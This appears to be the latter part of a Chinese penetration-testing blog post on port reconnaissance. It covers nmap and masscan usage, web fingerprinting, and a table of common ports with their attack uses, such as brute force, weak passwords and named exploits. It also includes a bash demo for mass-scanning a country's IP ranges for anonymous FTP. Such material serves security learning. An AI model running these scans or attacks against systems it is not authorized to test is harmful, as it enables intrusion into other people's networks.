<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">内网arp扫描,探测内网存活主机还是非常不错的,可轻易bypass掉各种应用层防火墙,既然是arp就没必要扫端口了,所以记得带上 -sn 选项 禁用端口扫描</span><br><span class="line"><span class="comment"># nmap -sn -PR 192.168.3.0/24</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">最常用的nmap组合,其实关于nmap的这些基本选项用法,不说大家也应该都早用的熟透了,每个选项参数作用在工具帮助里就已经说的非常清楚</span><br><span class="line"># nmap --open -p port -Pn -v -sT -sV --script script_name ip/domain/cidr</span><br></pre></td></tr></table></figure>
<p>0x07 如何快速对目标网站的一些基本情况做简要判断,如,对方用的什么web服务器,后端脚本是啥,数据库是啥,系统平台又是啥等……,下面就来简单熟悉一些常见的web架构:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">asp  + access + iis5.<span class="number">0</span>/<span class="number">6.0</span> + win2003/<span class="number">03</span>r2</span><br><span class="line">aspx + mssql2005/mssql2008 + iis7.<span class="number">0</span>/iis7.<span class="number">5</span> + win2008/08r2</span><br><span class="line">php[<span class="number">5.2</span>,<span class="number">5.4</span>,<span class="number">5.6</span>]  + mysql[<span class="number">5.1</span>,<span class="number">5.5</span>]/postgresql + apache[<span class="number">2.2</span>,<span class="number">2.4</span>]/iis + linux/win</span><br><span class="line">php/jsp + mysql + ngnix + linux/win</span><br><span class="line">java/jsp  + oracle/mssql + tomcat + linux/win</span><br><span class="line">……</span><br></pre></td></tr></table></figure></p>
<p>利用httprint 识别web目标服务器指纹 [ 其实是个比较鸡肋的一个小工具,一般看下响应头中的server字段就有了,不过,这里的并不准,很容易被改掉 ]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># httprint -h 144.214.20.118 -s ./Desktop/signature.txt</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">web服务器指纹字典下载地址<span class="symbol">:</span></span><br><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.net-square.com/signature</span>.txt</span><br></pre></td></tr></table></figure>
<p>常用的几个相对比较实用的firefox插件,自己在配置渗透环境的时候最好都预先装上:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hackbar</span><br><span class="line">tamper data</span><br><span class="line">live http headers</span><br><span class="line">firebug</span><br><span class="line">downthemall</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>使用 whatweb [探测到的信息相对比较全面],返回的结果中大致包括以下内容:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">请求返回的状态码</span><br><span class="line">web服务器版本</span><br><span class="line">ip所在国家</span><br><span class="line">操作系统详细的版本信息</span><br><span class="line">脚本语言版本信息</span><br><span class="line">域名解析到的ip</span><br><span class="line">截取并显示网站标题</span><br><span class="line">等等……</span><br></pre></td></tr></table></figure></p>
<p>如何快速判断目标使用的系统平台:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在url中尝试变化大小写,进行请求,观察页面响应,windows默认对大小写不敏感,linux则严格区分大小写,所以返回的页面肯定是不一样的</span><br><span class="line">观察各种报错信息,看看里面有没有泄露服务器的相关信息</span><br><span class="line">等等……</span><br></pre></td></tr></table></figure></p>
<p>0x08 一些常见端口渗透用途汇总:</p>
<table>
<thead>
<tr>
<th>端口号</th>
<th style="text-align:center">端口服务/协议简要说明</th>
<th style="text-align:center">关于端口可能的一些渗透用途</th>
</tr>
</thead>
<tbody>
<tr>
<td>tcp 20,21</td>
<td style="text-align:center">ftp 默认的数据和命令传输端口[可明文亦可加密传输]</td>
<td style="text-align:center">允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp 2.3.4)</td>
</tr>
<tr>
<td>tcp 22</td>
<td style="text-align:center">ssh[数据ssl加密传输]</td>
<td style="text-align:center">可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输,等等…常用于linux远程管理…</td>
</tr>
<tr>
<td>tcp 23</td>
<td style="text-align:center">telnet[明文传输]</td>
<td style="text-align:center">爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令,也许会有意想不到的收获</td>
</tr>
<tr>
<td>tcp 25</td>
<td style="text-align:center">smtp[简单邮件传输协议,多数linux发行版可能会默认开启此服务]</td>
<td style="text-align:center">邮件伪造,vrfy/expn 查询邮件用户信息,可使用smtp-user-enum工具来自动跑</td>
</tr>
<tr>
<td>tcp/udp 53</td>
<td style="text-align:center">dns[域名解析]</td>
<td style="text-align:center">允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控</td>
</tr>
<tr>
<td>tcp/udp 69</td>
<td style="text-align:center">tftp[简单文件传输协议,无认证]</td>
<td style="text-align:center">尝试下载目标及其的各类重要配置文件</td>
</tr>
<tr>
<td>tcp 80-89,443,8440-8450,8080-8089</td>
<td style="text-align:center">web[各种常用的web服务端口]</td>
<td style="text-align:center">各种常用web服务端口,可尝试经典的top n,vpn,owa,webmail,目标oa,各类java控制台,各类服务器web管理面板,各类web中间件漏洞利用,各类web框架漏洞利用等等……</td>
</tr>
<tr>
<td>tcp 110</td>
<td style="text-align:center">[邮局协议,可明文可密文]</td>
<td style="text-align:center">可尝试爆破,嗅探</td>
</tr>
<tr>
<td>tcp 137,139,445</td>
<td style="text-align:center">samba[smb实现windows和linux间文件共享,明文]</td>
<td style="text-align:center">可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等……</td>
</tr>
<tr>
<td>tcp 143</td>
<td style="text-align:center">imap[可明文可密文]</td>
<td style="text-align:center">可尝试爆破</td>
</tr>
<tr>
<td>udp 161</td>
<td style="text-align:center">snmp[明文]</td>
<td style="text-align:center">爆破默认团队字符串,搜集目标内网信息</td>
</tr>
<tr>
<td>tcp 389</td>
<td style="text-align:center">ldap[轻量级目录访问协议]</td>
<td style="text-align:center">ldap注入,允许匿名访问,弱口令</td>
</tr>
<tr>
<td>tcp 512,513,514</td>
<td style="text-align:center">linux rexec</td>
<td style="text-align:center">可爆破,rlogin登陆</td>
</tr>
<tr>
<td>tcp 873</td>
<td style="text-align:center">rsync备份服务</td>
<td style="text-align:center">匿名访问,文件上传</td>
</tr>
<tr>
<td>tcp 1194</td>
<td style="text-align:center">openvpn</td>
<td style="text-align:center">想办法钓vpn账号,进内网</td>
</tr>
<tr>
<td>tcp 1352</td>
<td style="text-align:center">Lotus domino邮件服务</td>
<td style="text-align:center">弱口令,信息泄漏,爆破</td>
</tr>
<tr>
<td>tcp 1433</td>
<td style="text-align:center">mssql数据库</td>
<td style="text-align:center">注入,提权,sa弱口令,爆破</td>
</tr>
<tr>
<td>tcp 1521</td>
<td style="text-align:center">oracle数据库</td>
<td style="text-align:center">tns爆破,注入,弹shell…</td>
</tr>
<tr>
<td>tcp 1500</td>
<td style="text-align:center">ispmanager    主机控制面板</td>
<td style="text-align:center">弱口令</td>
</tr>
<tr>
<td>tcp 1025,111,2049</td>
<td style="text-align:center">nfs</td>
<td style="text-align:center">权限配置不当</td>
</tr>
<tr>
<td>tcp 1723</td>
<td style="text-align:center">pptp</td>
<td style="text-align:center">爆破,想办法钓vpn账号,进内网</td>
</tr>
<tr>
<td>tcp 2082,2083</td>
<td style="text-align:center">cpanel主机管理面板登录</td>
<td style="text-align:center">弱口令</td>
</tr>
<tr>
<td>tcp 2181</td>
<td style="text-align:center">zookeeper</td>
<td style="text-align:center">未授权访问</td>
</tr>
<tr>
<td>tcp 2601,2604</td>
<td style="text-align:center">zebra路由</td>
<td style="text-align:center">默认密码zerbra</td>
</tr>
<tr>
<td>tcp 3128</td>
<td style="text-align:center">squid代理服务</td>
<td style="text-align:center">弱口令</td>
</tr>
<tr>
<td>tcp 3312,3311</td>
<td style="text-align:center">kangle主机管理登录</td>
<td style="text-align:center">弱口令</td>
</tr>
<tr>
<td>tcp 3306</td>
<td style="text-align:center">mysql数据库</td>
<td style="text-align:center">注入,提权,爆破</td>
</tr>
<tr>
<td>tcp 3389</td>
<td style="text-align:center">windows rdp远程桌面</td>
<td style="text-align:center">shift后门[需要03以下的系统],爆破,ms12-020[蓝屏exp]</td>
</tr>
<tr>
<td>tcp 4848</td>
<td style="text-align:center">glassfish控制台</td>
<td style="text-align:center">弱口令</td>
</tr>
<tr>
<td>tcp 4899</td>
<td style="text-align:center">radmin远程桌面管理工具,现在已经非常非常少了</td>
<td style="text-align:center">抓密码拓展机器</td>
</tr>
<tr>
<td>tcp 5000</td>
<td style="text-align:center">sybase/DB2数据库</td>
<td style="text-align:center">爆破,注入</td>
</tr>
<tr>
<td>tcp 5432</td>
<td style="text-align:center">postgresql数据库</td>
<td style="text-align:center">爆破,注入,弱口令</td>
</tr>
<tr>
<td>tcp 5632</td>
<td style="text-align:center">pcanywhere远程桌面管理工具</td>
<td style="text-align:center">抓密码,代码执行,已经快退出历史舞台了</td>
</tr>
<tr>
<td>tcp 5900,5901,5902</td>
<td style="text-align:center">vnc远程桌面管理工具</td>
<td style="text-align:center">弱口令爆破,如果信息搜集不到位,成功几率很小</td>
</tr>
<tr>
<td>tcp 5984</td>
<td style="text-align:center">CouchDB</td>
<td style="text-align:center">未授权导致的任意指令执行</td>
</tr>
<tr>
<td>tcp 6379</td>
<td style="text-align:center">redis未授权</td>
<td style="text-align:center">可尝试未授权访问,弱口令爆破</td>
</tr>
<tr>
<td>tcp 7001,7002</td>
<td style="text-align:center">weblogic控制台</td>
<td style="text-align:center">java反序列化,弱口令</td>
</tr>
<tr>
<td>tcp 7778</td>
<td style="text-align:center">kloxo</td>
<td style="text-align:center">主机面板登录</td>
</tr>
<tr>
<td>tcp 8000</td>
<td style="text-align:center">Ajenti主机控制面板</td>
<td style="text-align:center">弱口令</td>
</tr>
<tr>
<td>tcp 8443</td>
<td style="text-align:center">plesk主机控制面板</td>
<td style="text-align:center">弱口令</td>
</tr>
<tr>
<td>tcp 8069</td>
<td style="text-align:center">zabbix</td>
<td style="text-align:center">远程执行,sql注入</td>
</tr>
<tr>
<td>tcp 8080-8089</td>
<td style="text-align:center">Jenkins,jboss</td>
<td style="text-align:center">反序列化,控制台弱口令</td>
</tr>
<tr>
<td>tcp 9080-9081,9090</td>
<td style="text-align:center">websphere控制台</td>
<td style="text-align:center">java反序列化/弱口令</td>
</tr>
<tr>
<td>tcp 9200,9300</td>
<td style="text-align:center">elasticsearch</td>
<td style="text-align:center">远程执行</td>
</tr>
<tr>
<td>tcp 10000</td>
<td style="text-align:center">webmin linux主机web控制面板入口</td>
<td style="text-align:center">弱口令</td>
</tr>
<tr>
<td>tcp 11211</td>
<td style="text-align:center">memcached</td>
<td style="text-align:center">未授权访问</td>
</tr>
<tr>
<td>tcp 27017,27018</td>
<td style="text-align:center">mongodb</td>
<td style="text-align:center">爆破,未授权访问</td>
</tr>
<tr>
<td>tcp 3690</td>
<td style="text-align:center">svn服务</td>
<td style="text-align:center">svn泄露,未授权访问</td>
</tr>
<tr>
<td>tcp 50000</td>
<td style="text-align:center">SAP Management Console</td>
<td style="text-align:center">远程执行</td>
</tr>
<tr>
<td>tcp 50070,50030</td>
<td style="text-align:center">hadoop</td>
<td style="text-align:center">默认端口未授权访问</td>
</tr>
</tbody>
</table>
<p><br></p>
<p>0x09 说了这么多,想必大家应该很清楚这些端口具体该怎么利用了</p>
<p>0x10 最后,在介绍个小脚本,whatportis 专门用来查询某个端口具体作用的</p>
<p>0x11 如果你有兴趣,想针对某个国家网段进行大规模扫描也可以把它写成这样,当然,我这里是随便写的,你要想实际用肯定是远远不够的,单单只是提供个小demo,能自动化的事情还有很多,写个shell还是比较简单的,还是留给大家根据自己的实际需求自行发挥吧,反正工具就在那里,相互配合才能出效果,各自为战是很难有所作为的<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">while read LINE</span><br><span class="line">do</span><br><span class="line">   masscan -p 21 --rate=100 $LINE | tee -a 21.txt</span><br><span class="line">done &lt; hk_ip.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> tail -f 21.txt</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> awk &#123;<span class="string">'print $6'</span>&#125; 21.txt &gt;&gt; result.txt</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> nmap -p 21 -iL result.txt  -oN ftp_anonymous.txt  -v --script ftp-anon.nse</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<p>后话:<br>&nbsp;&nbsp;&nbsp;&nbsp;关于端口渗透,如果不是你自己写工具的情况下,其实本身使用上并没多少技术含量,至于无状态扫描的具体内部实现还是比较复杂的,至今为止,很多东西我自己也扔在学习中,如果大家真想深入去理解,非常建议自己直接拿着wireshark一边跑一边认真观察分析,没有什么比数据包更能说明问题,篇幅限制,这里我就不一一把每种扫描方式都带着大家跑一遍了,有些东西还是需要自己亲自尝试,不然,别人的东西永远都只是别的,端口这个东西,怎么说呢,有很多运气和经验敏感度的成分在里面,可能还要外加一个高质量的字典,另外,再多说一句,在没有十足的把握的情况下,直接在公网跑字典基本是不太靠谱的,实际测试中,对一些稍有防护的目标,爆破的成率还是蛮低的[虽然低,但往往非常有效,走投无路时不妨尝试],当然啦,对于端口,爆破只是很小的一个方面,比如,当我们发现某个工具或者系统服务存在远程溢出或者代码执行[不仅限于此类的可远程利用的漏洞,任何可以直接远程主动getshell的都可以],还是那句话,如果你手里有某个主流服务的通杀远程0day,不管是你自己挖的还是买的,也许只有这时才能体现端口扫描的真正价值,另外,还有多如牛毛的小工具,这里都没提到,后续涉及到内网时我们再仔细说明,对于公网扫描,有这些,暂时足矣,祝大家好运,切记不要干坏事就好!<br><br></p>

        </div>
    

</div>
            
        </section>
    </div>
</div>



    <div class="row">
        <div class="col-sm-12">
            <div class="wrap-pagination">
                <a class="" href="/page/13/">
                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
                </a>
                <a class="" href="/page/15/">
                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
                </a>
            </div>
        </div>
    </div>




</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2017/12/29/cobalt-strike-dns/">对 Cobalt Strike DNS隧道的理解与</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2017/12/29/cobalt-strike-spawn/">灵活使用 cobalt strike 的 `spa</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2017/12/27/powershell-pic-execute/">通过图片免杀执行远程powershell代码</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2017/12/26/modify-webshell/">实时精准侦测站点目录中的各类 webshell</a>
            </li>
            
        </ul>
    </div>



            
<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
    <h2>Categories</h2>
    <ul>
        
        <li>
            <a class="footer-post" href="/categories/接下来的路/">接下来的路</a>
        </li>
        
        <li>
            <a class="footer-post" href="/categories/privilege/">privilege</a>
        </li>
        
        <li>
            <a class="footer-post" href="/categories/LaZagne/">LaZagne</a>
        </li>
        
        <li>
            <a class="footer-post" href="/categories/python-basic/">python basic</a>
        </li>
        
    </ul>
</div>

        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a href="https://github.com/klugjo/hexo-theme-alpha-dust">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://twitter.com/?lang=en">
                            <span class="footer-icon-container">
                                <i class="fa fa-twitter"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.facebook.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-facebook"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.instagram.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-instagram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://dribbble.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-dribbble"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://plus.google.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-google-plus"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.behance.net/">
                            <span class="footer-icon-container">
                                <i class="fa fa-behance"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://500px.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-500px"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:test@example.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="\#">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @Untitled. All right reserved | Design & Hexo <a href="http://www.codeblocq.com/">Jonathan Klughertz</a>
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->
<script src="/js/main.js"></script>

<!-- Disqus Comments -->



</body>

</html>